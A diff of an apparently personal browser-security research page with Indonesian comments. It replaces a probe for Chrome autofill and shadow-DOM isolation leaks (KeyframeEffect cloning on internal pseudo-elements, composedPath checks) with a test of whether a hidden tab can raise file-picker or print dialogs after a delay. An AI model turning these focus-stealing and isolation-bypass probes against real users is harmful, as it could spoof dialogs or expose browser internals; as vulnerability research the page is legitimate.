@@ -2,147 +2,79 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Security Research - FARISSAL B</title>
+    <title>Chrome UI Research - FARISSAL B</title>
     <style>
-        body { font-family: 'Consolas', monospace; background: #0d0d0d; color: #00ff00; padding: 20px; line-height: 1.4; }
-        .container { max-width: 900px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 8px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
-        .header { border-bottom: 2px solid #00ff00; margin-bottom: 20px; padding-bottom: 10px; }
-        h2 { margin: 0; color: #fff; text-transform: uppercase; }
-        
-        /* Area Input yang memicu Autofill */
-        .input-zone { background: #262626; padding: 20px; border-radius: 5px; margin-bottom: 20px; border: 1px dashed #555; }
-        label { display: block; margin-bottom: 10px; color: #aaa; font-size: 14px; }
-        input { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #00ff00; 
-            color: #fff; font-size: 18px; border-radius: 4px; box-sizing: border-box;
-        }
-        input:-webkit-autofill { -webkit-box-shadow: 0 0 0 30px #004400 inset !important; -webkit-text-fill-color: white !important; }
-
-        /* Console Log Style */
-        #terminal { 
-            background: #000; border: 1px solid #333; height: 400px; overflow-y: scroll; 
-            padding: 15px; font-size: 12px; color: #33ff33; border-radius: 4px;
-        }
-        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
-        .time { color: #888; margin-right: 10px; }
-        .leak-alert { color: #ff0000; font-weight: bold; background: #330000; padding: 2px 5px; border-radius: 3px; animation: blink 1s infinite; }
-        .info { color: #0088ff; }
-        
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
+        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #fff; padding: 30px; text-align: center; }
+        .box { border: 2px solid #ff00ff; padding: 20px; border-radius: 15px; background: #1e1e1e; display: inline-block; }
+        button { background: #ff00ff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; margin: 10px; font-weight: bold; }
+        button:hover { background: #d400d4; }
+        #log { margin-top: 30px; text-align: left; background: #000; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: auto; border: 1px solid #333; }
+        .alert { color: #ff3333; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <h2>Chrome Vulnerability Scanner [v2.0]</h2>
-        <p>Researcher: <b>FARISSAL B</b> | Target: User-Agent Shadow DOM</p>
-    </div>
-
-    <div class="input-zone">
-        <label>Pancing Autofill di sini (Klik lalu Hover saran yang muncul):</label>
-        <input id="target-input" type="text" placeholder="Klik untuk Trigger Autofill..." autocomplete="street-address" name="address">
-    </div>
-
-    <div id="terminal">
-        <div class="log-entry"><span class="time">[SYSTEM]</span> Menunggu interaksi user...</div>
-    </div>
+<div class="box">
+    <h2>Chrome UI/Logic Researcher v3.0</h2>
+    <p>Target: <b>Split View / Side Panel Focus Bypass</b></p>
+    
+    <button onclick="triggerSpoof('file')">Test File Picker</button>
+    <button onclick="triggerSpoof('print')">Test Print Dialog</button>
+    <button onclick="delayedTrigger()">Delayed Attack (5s)</button>
+    
+    <div id="log">>> Scanner Ready. Push to GitHub and test in Split View.</div>
 </div>
 
 <script>
-    const terminal = document.getElementById('terminal');
-    const inp = document.getElementById('target-input');
+    const logBox = document.getElementById('log');
 
-    function writeLog(msg, type = 'normal') {
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        const now = new Date().toLocaleTimeString();
-        let content = `<span class="time">[${now}]</span> `;
-        
-        if (type === 'leak') content += `<span class="leak-alert">!!! LEAK !!!</span> ${msg}`;
-        else if (type === 'info') content += `<span class="info">[INFO]</span> ${msg}`;
-        else content += `<span>[SYSTEM]</span> ${msg}`;
-        
-        entry.innerHTML = content;
-        terminal.appendChild(entry);
-        terminal.scrollTop = terminal.scrollHeight;
+    function log(msg, isAlert = false) {
+        const div = document.createElement('div');
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${isAlert ? '<span class="alert">!!!</span> ' : ''}${msg}`;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
     }
 
-    // 1. MONITORING COMPOSED PATH (Mencari Shadow DOM Leak)
-    const monitorEvents = ['mouseover', 'mousedown', 'touchstart', 'focus'];
-    monitorEvents.forEach(evt => {
-        inp.addEventListener(evt, (e) => {
-            const path = e.composedPath();
-            // Jika path lebih dari standar (Window -> Document -> HTML -> Body -> Container -> Input)
-            if (path.length > 6) {
-                writeLog(`Event "${evt}" mendeteksi kedalaman UI: ${path.length}`, 'info');
-                path.forEach(node => {
-                    // Cari object yang bukan elemen standar
-                    const nodeStr = node.toString();
-                    if (nodeStr.includes('ShadowRoot') || nodeStr.includes('Internal')) {
-                        writeLog(`ACCESS GRANTED TO: ${nodeStr}`, 'leak');
-                        console.dir(node);
-                    }
-                });
-            }
-        });
-    });
-
-    // 2. KEYFRAMEEFFECT CLONING ATTACK (Brendan Draper Technique)
-    function runCloningAttack() {
-        const internalPseudos = [
-            "::-webkit-contacts-auto-fill-button",
-            "::placeholder",
-            "::-internal-autofill-previewed",
-            "::-webkit-inner-spin-button"
-        ];
-
-        internalPseudos.forEach(pseudo => {
-            try {
-                let effect = new KeyframeEffect(inp, [
-                    { filter: 'blur(0px)' }, { filter: 'blur(1px)' }
-                ], { duration: 10, pseudoElement: pseudo });
-
-                let clone = new KeyframeEffect(effect);
-                
-                // Jika target hasil clone bukan lagi elemen input aslinya, berarti isolasi bocor
-                if (clone.target && clone.target !== inp) {
-                    writeLog(`Bypass Isolasi pada pseudo ${pseudo}! Target: ${clone.target.tagName}`, 'leak');
-                    console.log("Leaked Target Node:", clone.target);
-                }
-            } catch (e) {
-                // Squelch errors for unsupported pseudos
-            }
-        });
+    // Fungsi untuk memicu dialog sistem
+    function triggerSpoof(type) {
+        log(`Triggering ${type} dialog...`);
+        
+        if (type === 'file') {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.click(); // Mencoba membuka file picker
+        } else if (type === 'print') {
+            window.print(); // Mencoba membuka print dialog
+        }
     }
 
-    // 3. AUTOFILL STATE OBSERVER
-    let isAutofilled = false;
-    setInterval(() => {
-        // Deteksi jika Chrome memberikan warna background autofill (biasanya kuning/biru)
-        const currentStyle = getComputedStyle(inp);
-        const hasAutofillClass = inp.matches(':-webkit-autofill');
+    // Teknik "Delayed Attack": 
+    // Menjalankan perintah SETELAH user pindah ke tab lain (Split View test)
+    function delayedTrigger() {
+        log("Delayed attack started. PINDAH KE TAB LAIN SEKARANG!");
+        
+        setTimeout(() => {
+            log("Executing background trigger...", true);
+            
+            // Mencoba mencuri fokus dengan memicu dialog saat tab ini tidak aktif
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.click();
+            
+            // Cek apakah dialog berhasil muncul di atas tab yang sedang aktif
+            if (document.hidden) {
+                log("DANGER: Dialog triggered while tab was HIDDEN!", true);
+            } else {
+                log("Tab was active, isolation working.");
+            }
+        }, 5000); // 5 detik untuk lo pindah fokus ke tab sebelah (Google/Drive)
+    }
 
-        if (hasAutofillClass && !isAutofilled) {
-            isAutofilled = true;
-            writeLog("State: AUTOFILL DETECTED! Menjalankan Scan Agresif...", 'info');
-            runCloningAttack();
-        } else if (!hasAutofillClass) {
-            isAutofilled = false;
-        }
-    }, 500);
-
-    // 4. ANIMATION LEAK DETECTOR
-    inp.addEventListener('animationstart', (e) => {
-        writeLog(`Animasi dimulai pada: ${e.target.tagName || 'Unknown Node'}`, 'info');
-        if (e.target !== inp) {
-            writeLog("Anomali Target Animasi Terdeteksi!", 'leak');
-        }
+    // Deteksi perubahan visibilitas tab
+    document.addEventListener("visibilitychange", () => {
+        log(`Tab Status: ${document.hidden ? 'HIDDEN' : 'VISIBLE'}`);
     });
 
-    writeLog("Scanner siap. Gunakan Chrome Canary untuk hasil riset terbaik.", 'info');
 </script>
-
 </body>
 </html>
